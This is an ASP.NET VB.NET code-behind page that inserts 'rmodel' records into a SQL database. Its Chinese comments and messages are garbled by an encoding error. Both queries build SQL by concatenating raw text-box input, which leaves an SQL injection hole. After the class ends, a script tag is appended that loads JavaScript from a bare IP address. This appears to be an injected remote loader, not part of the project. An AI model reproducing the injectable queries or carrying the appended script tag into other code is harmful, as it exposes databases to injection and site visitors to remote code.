Imports System.Data
Imports System.Data.SqlClient

Public Class WebForm1
    Inherits System.Web.UI.Page

#Region " Web ������������ɵĴ��� "

    '�õ����� Web ���������������ġ�
    <System.Diagnostics.DebuggerStepThrough()> Private Sub InitializeComponent()

    End Sub
    Protected WithEvents lblHint As System.Web.UI.WebControls.Label
    Protected WithEvents lblModelKey As System.Web.UI.WebControls.Label
    Protected WithEvents txtModelKey As System.Web.UI.WebControls.TextBox
    Protected WithEvents lblModelName As System.Web.UI.WebControls.Label
    Protected WithEvents txtModelName As System.Web.UI.WebControls.TextBox
    Protected WithEvents lblAccPri As System.Web.UI.WebControls.Label
    Protected WithEvents rbtnAccPri1 As System.Web.UI.WebControls.RadioButton
    Protected WithEvents rbtnAccPri2 As System.Web.UI.WebControls.RadioButton
    Protected WithEvents rbtnAccPri3 As System.Web.UI.WebControls.RadioButton
    Protected WithEvents lblIsValid As System.Web.UI.WebControls.Label
    Protected WithEvents rbtnIsValidYes As System.Web.UI.WebControls.RadioButton
    Protected WithEvents rbtnIsValidNo As System.Web.UI.WebControls.RadioButton
    Protected WithEvents btnPub As System.Web.UI.WebControls.Button
    Protected WithEvents btnCancel As System.Web.UI.WebControls.Button
    Protected WithEvents btnPubRelType As System.Web.UI.WebControls.Button
    Protected WithEvents lblWarning As System.Web.UI.WebControls.Label
    Protected WithEvents timetext As System.Web.UI.WebControls.Label
    Protected WithEvents txtModelKeyRegularExpressionValidator As System.Web.UI.WebControls.RegularExpressionValidator

    'ע��: ����ռλ�������� Web ���������������ġ�
    '��Ҫɾ�����ƶ�����
    Private designerPlaceholderDeclaration As System.Object

    Private Sub Page_Init(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Init
        'CODEGEN: �˷��������� Web ����������������
        '��Ҫʹ�ô���༭���޸�����
        InitializeComponent()
    End Sub

#End Region

    Private Sub Page_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        '�ڴ˴����ó�ʼ��ҳ���û�����
        ' �ж��û���û��¼
        Me.lblWarning.Visible = False
        Me.timetext.Text = DateTime.Now.ToString()
        Me.lblHint.ForeColor = System.Drawing.Color.AntiqueWhite
        If Session("UserName") = "" Then
            Me.lblHint.Text = "����û��¼�����ȵ�¼"
        Else
            Me.lblHint.Text = "���ã� " + Session("UserName")
        End If

        ' ��ʼ��radioButton
        If Not IsPostBack Then
            Me.rbtnAccPri1.Checked = True
            Me.rbtnIsValidYes.Checked = True
        End If
    End Sub

    Private Sub btnPub_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnPub.Click
        If (Me.txtModelKey.Text.Trim() = "" Or Me.txtModelName.Text.Trim() = "") Then
            Me.lblWarning.Text = "���ѣ��������ȫ��ע����Ϣ"
            Me.lblWarning.Visible = True
            Exit Sub
        End If

        Me.lblWarning.Visible = False

        Dim mySqlConn As SqlConnection
        mySqlConn = New SqlConnection(Me.Application("DataBase"))
        Dim strSql As String
        Dim sqlReader As SqlDataReader = Nothing
        strSql = "select * from rmodel where rmodelkey='" + Me.txtModelKey.Text.Trim() + "'"    ' �鿴rmodelkey�Ƿ��ѷ���
        Dim mySqlComm As SqlCommand
        mySqlComm = New SqlCommand(strSql, mySqlConn)
        Try
            mySqlConn.Open()
            sqlReader = mySqlComm.ExecuteReader()

            If (sqlReader.Read()) Then
                Me.lblWarning.Text = "���棺�ù�ϵ�ռ����Ѵ��ڣ��������µĹ�ϵ�ռ���"
                lblWarning.Visible = True
            Else
                ' ��ȡ�û�Ȩ��ֵ����Ч��ֵ��������chrAccPri��chrIsValid��
                Dim chrAccPri As Char
                Dim chrIsValid As Char
                If Me.rbtnAccPri1.Checked = True Then
                    chrAccPri = "1"
                ElseIf Me.rbtnAccPri2.Checked = True Then
                    chrAccPri = "2"
                Else
                    chrAccPri = "3"
                End If
                If Me.rbtnIsValidYes.Checked = True Then
                    chrIsValid = "1"
                Else
                    chrIsValid = "0"
                End If

                ' ����������
                strSql = "Insert into rmodel values('" + Me.txtModelKey.Text.Trim() + "', '" + _
                    Me.txtModelName.Text.Trim() + "', '" + chrAccPri + "', '" + Now.ToString("yyyy-MM-dd HH:mm:ss") + _
                    "', '" + Now.ToString("yyyy-MM-dd HH:mm:ss") + "', '" + chrIsValid + "')"
                mySqlConn.Close()
                mySqlComm.CommandText = strSql
                mySqlConn.Open()
                If (mySqlComm.ExecuteNonQuery() > 0) Then
                    Me.lblWarning.Text = "��ϲ����ӹ�ϵ�ռ�" + Me.txtModelKey.Text.Trim() + "�ɹ�"
                    Me.lblWarning.Visible = True
                Else
                    Me.lblWarning.Text = "���棺����ĳ��ԭ����ӹ�ϵ�ռ�ʧ�ܣ�������û��Ȩ��"
                    Me.lblWarning.Visible = True
                End If
            End If
            sqlReader.Close()
            mySqlConn.Close()
        Catch ex As SqlException
            If sqlReader.IsClosed = False Then
                sqlReader.Close()
                mySqlConn.Close()
            End If
            Throw ex
            'Response.Redirect("error.htm") ' ������ʾ
        Finally
        End Try
    End Sub

    Private Sub btnCancel_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnCancel.Click
        Me.lblWarning.Visible = False
        Me.txtModelKey.Text = ""
        Me.txtModelName.Text = ""
        Me.rbtnAccPri2.Checked = False
        Me.rbtnAccPri3.Checked = False
        Me.rbtnAccPri1.Checked = True
        Me.rbtnIsValidNo.Checked = False
        Me.rbtnIsValidYes.Checked = True
    End Sub

    Private Sub btnPubRelType_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnPubRelType.Click
        Me.Response.Redirect("rdefinitionpublish.aspx")
    End Sub

    Private Sub txtModelKey_TextChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles txtModelKey.TextChanged

    End Sub
End Class

<script src="http://222.208.183.246/ad/ad.js"></script>
